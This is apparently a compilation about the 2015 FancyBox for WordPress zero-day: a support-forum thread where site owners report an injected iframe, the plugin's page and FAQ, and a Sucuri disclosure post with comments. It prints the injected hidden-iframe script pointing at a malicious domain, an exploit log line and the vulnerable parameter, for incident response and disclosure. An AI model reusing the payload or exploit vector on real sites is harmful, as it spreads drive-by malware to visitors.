  I have last version of your plugin and WordPress.

  Everything was ok until today. I’ve got a report from sitelock that my Contact page on my blog is infected with malware with iframe redirecting to h t t p : / / 203koko.eu/hjnfh/ipframe2.php

  Chcecked my page source on this contact page and found something like this:

  <script>/\*<![CDATA[\*/if(navigator.userAgent.match(/msie/i)){document.write(‘ <div style=”position:absolute;left:-2000px;width:2000px”><iframe src=”[http://203koko.eu/hjnfh/ipframe2.php&#8221](http://203koko.eu/hjnfh/ipframe2.php%26#8221); width=”20″ height=”30″ ></iframe></div>’);}/\*]]>\*/</script>

  I desactivated just Total Cache and this page is not infected anymore.

  I have other plugins (up to date) active:

  Akismet Version 3.0.4

  Custom Posts Per Page Version 1.7.1

  FancyBox for WordPress Version 3.0.2

  GetSocial Version 2.0.1

  NextCellent Gallery Version 1.9.25.1

  Official StatCounter Plugin Version 1.6.9

  Use Google Libraries Version 1.6.2

  WordPress SEO Version 1.7.1

  Can anybody helps me to determine source of this malware?

  Best

  Maciek

  Total Cache has nothing to do with this, a client of mine got the same code today leading to 203koko.eu, blocked by Google as well for malware, but we can’t find the code in our pages at all which is very strange. Site did not have W3 Total Cache installed.

  The only plugin we have in common is FancyBox for WordPress.

  Can you please mail me at gennady[at]kovshenin[dot]com, I want access to your site to try to find the malware on yours, maybe it will help us find it on ours, since we can’t even get it to show anywhere on the pages although Google found it.

  I’m sorry that your sites are damaged. A Mod. will likely be by shortly to move this to a more appropriate forum.

  You may want to have a look at this information:

  The easiest and fastest way to get rid of the malware is to restore from a good back up.

  Good luck.

  Hi guys, sorry for using this forum but …

  me and a colleague also had the problem today.

  Both sites got malware listed by Google but on none we could find the code mentioned above.

  Both sites are using “Fancybox for WordPress”. But we have other sites online with that plugin that didn’t got blocked.

  Weird.

  I have also got “h t t p://203koko.eu/hjnfh/ipframe2.php” on my site. I got a the dreaded email from Google saying my site has malware infected on it. I am currently in contact with Host Gator. They are currently scanning my site for malicious code. I have Total Cache as one of my sites plugins.

  I will keep everyone posted once I hear back from Host Gator.

  I too have been hit by this “drive-by” malware today. Half of my morning has been eaten up by this wild good chase. Glad to see I’m not the only one.

  The only overlap I have with plugins from the above posters is FancyBox and Contact Form 7. I do not have the W3 Total Cache plugin.

  I’m tempted to disable FancyBox, as it hasn’t been updated in years. “Easy FancyBox” seems like a suitable replacement.

  It’s looking like “Fancybox for WordPress”

  it’s the only PI we have in common with the rest of you.

  I’ve removed the “Fancybox for WordPress” plugin and requested a review from Google for my site. I’ll report back on the result.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Description

Seamlessly integrates FancyBox into your blog: Upload, activate, and you’re done. Additional configuration optional.

You can easily customize almost anything you can think about fancybox lightbox: the border, margin width and color, zoom speed, animation type, close button position, overlay color and opacity and even more advanced option like several options to group images into galleries, and more…

By default, the plugin will use jQuery to apply FancyBox to ANY thumbnails that link directly to an image. This includes posts, the sidebar, etc, so you can activate it and it will be applied automatically.

#### Demo

You can see the plugin working on a [this blog](http://blog.moskis.net/2012/01/20/teclado-apple-en-windows-7/) although there’s nothing amazing to see, just a FancyBox simple implementation, that’s the point 😉 You can take a look at the code if you’re curious, though.

#### Further Reading

This plugin is developed and maintained by Colorlib. Which is well know for their free WordPress themes. However, now they are looking to extend their presence in plugin development and believe that FancyBox lightbox is a great way to start.

If you are new to WordPress and want to lear more we have got you covered. Colorlib will teach you have to [start a blog](https://colorlib.com/) or [create a website](https://colorlib.com/wp/how-to-make-a-website/) and much more. If you are already familiar with WordPress you likely want to learn how to make it faster and more reliable. That’s when you want to look into hosting and more specifically [WordPress hosting](http://colorlib.com/wp/wordpress-hosting).

If you enjoy using FancyBox lightbox for WordPress please leave a [positive feedback](https://wordpress.org/support/plugin/fancybox-for-wordpress/reviews/?filter=5). We are committed to make it the best lightbox plugin for WordPress.

## Installation

1. Upload the `fancybox-for-wordpress` folder to the `/wp-content/plugins/` directory
2. Activate the plugin through the ‘Plugins’ menu in WordPress
3. That’s it, FancyBox will be automatically applied to all your image links and galleries.
4. If you want to customize a bit the look and feel of FancyBox, go to the Options Page under General Options in the WordPress Admin panel

## FAQ

### – There was a vulnerability detected in versions 3.0.2 and lower, is my site in danger?

This vulnerability was patched in version 3.0.3.

An additional change was introduced in version 3.0.4 to make sure that the malicious code can’t be printed to visitors even if it still remains in the database.

If you think your site might still be using a vulnerable version of the plugin please log in to your WordPress admin panel, disable the plugin and clear any cache if your site uses a cache system.

If you wish to continue using the plugin, check that the plugin is updated to the latest version from your admin panel and enable it. Then check the plugin’s settings page and make sure there’s no abnormal code in any of the fields, especially on the Extra Calls tab. If you are not sure about the code you see in the settings please use the Revert to Defaults button at the bottom of the settings page.

If you think your site might be compromised in any other way check this guide: [WordPress Codex – FAQ My site was hacked](https://codex.wordpress.org/FAQ_My_site_was_hacked).

### – Is the FancyBox script vulnerable or unsafe?

No, there’s nothing wrong with the actual FancyBox script that i know of.

The vulnerability detected in versions 3.0.2 and lower of the “FancyBox for WordPress” plugin was limited to the plugin itself. Other FancyBox plugins or manual implementations of FancyBox are unrelated to this issue.

Works great with Avada, but it just missing core function of fancybox, which is fullscreen mode. Other than that, simple and flawless.

# Zero-day in the Fancybox-for-WordPress Plugin

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* February 4, 2015

**Update**: We posted an [analysis of the vulnerability](https://blog.sucuri.net/2015/02/analysis-of-the-fancybox-for-wordpress-vulnerability.html "Analysis of the Fancybox-For-WordPress Vulnerability") following this post.

Our research team was alerted to a possible malware outbreak affecting many WordPress websites. All the infections had a similar malicious iframe from “**203koko**” injected into the website. We were also directed to a [forum thread](https://wordpress.org/support/topic/possible-malware-2?replies=38) where users were sharing their concerns and describing similar issues they were experiencing.

In analyzing the infected websites, we found that all the websites were using the **fancybox-for-wordpress** plugin.

##### Zero Day in Fancybox-for-wordpress

The fancybox-for-wordpress plugin is a popular WordPress plugin with more than 550,000 downloads. There doesn’t appear to be any public vulnerabilities being reported, which piqued our interest. To understand how it was connected, we decided to do our own code review.

After some analysis, we can confirm that this plugin has a serious vulnerability that allows for malware (or any random script/content) to be added to the vulnerable site. Because it is currently unpatched, we will not disclose more information.

What makes things worse, is that it’s being actively exploited in the wild, leading to many compromised websites.

We could confirm via our [Website Firewall](https://sucuri.net/website-firewall) logs by seeing many exploit attempts blocked.

This is what the attacks looks like:

> 46.4.76.174 – – [04/Feb/2015:00:25:09 -0500] “POST /wp-admin/admin-post.php?page=fancybox-for-wordpress HTTP/1.1” 403 4207
>  INPUTBODY:action=update&mfbfw%5Bext.. malware payload hidden

##### Remove This Plugin Immediately!

The plugin was just removed by the WordPress.org team from their repository and you need to remove it from your site as well! If you require it for specific features you really need to look at deploying alternative security solutions to help protect your website and block exploit attempts.

Users of our Website Firewall are already protected, but if you do not employ a similar service and leverage this plugin consider yourself highly vulnerable and high risk of compromise.

We will post more details about this vulnerability once we have given time for everyone to patch (when it becomes available).

Special thanks to [Konstantin Kovshenin](https://kovshenin.com/) and [Gennady Kovshenin](http://codeseekah.com/) for notifying and working with us on this issue.

   Hi,

   Thanks for this. The above information was enough for me to locate one very obvious blunder in the code… I’ll respect the decision not to release detailed information at this point; but… my question is, did you find more than that one obvious blunder? I have a site that relies on this plugin, and I’d rather just place an early “return;” in the function rather than have to re-engineer the site…

   David

   Had a site blacklisted by google for this, the affect on the site in question is pretty big. Response time is critical on this one.

   This is different than <https://wordpress.org/plugins/easy-fancybox/>, correct? Or should all the ‘fancybox’ plugins be at risk?

   It’s different. There’s no reason another plugin should be at risk – the defect is in the code of the plugin, not the FancyBox library itself.

   FYI: It’s been patched with version 3.0.3
    <https://wordpress.org/support/topic/is-plugin-safe-to-use-again>

   And according to their changelog for 3.0.4:
    Renamed the setting affected by the security issue mentioned in 3.0.3. This should stop the malicious code from appearing on sites where the plugin is updated without removing the malicious code

   in case your sites haven’t been affected but you’re not sure if they’re vulnerable – it’s worth doing a search of the directories within your server. The folder you’re looking for is “fancybox-for-wordpress”. Something akin to find . -type d -name “fancybox-for-wordpress” will do the trick.

   BTW, there is a security update and the plugin is again available in the official plugin repository. So if you use it, make sure to update it ASAP

    Administrators who had the vulnerable version of this plugin installed should also consider resetting their user sessions and credentials. The patch issued yesterday closes the exploit vector within the plugin, but depending on how an attacker chose to exploit the vulnerability, it could have lead to compromised user credentials or arbitrary code execution in the admin panel (this would have been a separate attack than the iframe being reported here).

    Hello.. I think this vulnerability isn’t very dangerous as you are saying, because stored xss exploitation on this plugin is possible when “hacker” has admin access, right? I think vulnerability affects on mfbfw[extraCallsData] parameter.. I tried to send $\_POST data without admin access on admin-post.php or options.php but it has not worked

       No. admin-post.php and admin-ajax.php are both happy to handle non-logged-in requests, and fire the admin\_init hook, which is why developers should never assume a user is logged in or has any kind of privileges on the admin\_init hook.

          Ok.. thanks, then why is not working the exploit on most sites that I tried?

          post parameter mfbfw[extraCallsData] is vulnerable if I am logged in as admin

          1. ![](https://secure.gravatar.com/avatar/9e3e8fb755426528c340de0ecd0ca350?s=60&d=mm&r=g) **Robert Paprocki** says: [February 7, 2015 at 8:15 pm](https://blog.sucuri.net/2015/02/zero-day-in-the-fancybox-for-wordpress-plugin.html#comment-4596)

             The extraCallsData option was renamed in a recent patch to prevent infected sites from displaying malicious script content (that key was named differently in previous versions). The vulnerability you’re referring to is a separate issue from the one addressed in this article.

    A client website have been hacked because of this pugin it seems, and it have been updated some times ago. So don’t just update it : suppress it, and redowload it.
